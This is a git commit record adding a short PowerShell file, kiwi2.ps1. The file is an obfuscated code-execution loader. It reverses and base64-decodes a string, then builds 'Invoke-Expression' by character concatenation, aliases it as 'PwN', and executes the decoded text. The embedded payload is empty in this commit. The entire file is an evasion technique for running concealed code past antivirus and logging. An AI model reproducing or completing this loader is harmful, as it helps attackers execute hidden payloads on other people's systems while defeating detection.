015abc6ad7b92e8d3f5f0c0aad63696a9efcaa33
SezioS <118485549+sergiovks@users.noreply.github.com>
2025-04-15 14:46:52 +0200

    Create kiwi2.ps1

---
+++ kiwi2.ps1
@@ -0,0 +1,4 @@
+$Sx8F = "" ;
+$YyvKUcptgTB9OkS4 = $Sx8F.ToCharArray() ; [array]::Reverse($YyvKUcptgTB9OkS4) ; -join $YyvKUcptgTB9OkS4 2>&1> $null ;
+$prDVt4g7IEAMQYj = [sYSTEM.TEXT.ENcODInG]::UTf8.gETStrIng([sYSTeM.conVErT]::FRoMBase64StRinG("$YyvKUcptgTB9OkS4")) ;
+$mHgu20RrdnxPfMyIoa = "i"+"n"+"V"+"O"+"K"+"e"+"-"+"e"+"x"+"p"+"r"+"E"+"s"+"s"+"I"+"O"+"n" ; NeW-aliaS -nAmE PwN -VALuE $mHgu20RrdnxPfMyIoa -foRcE ; pwN $prDVt4g7IEAMQYj ;
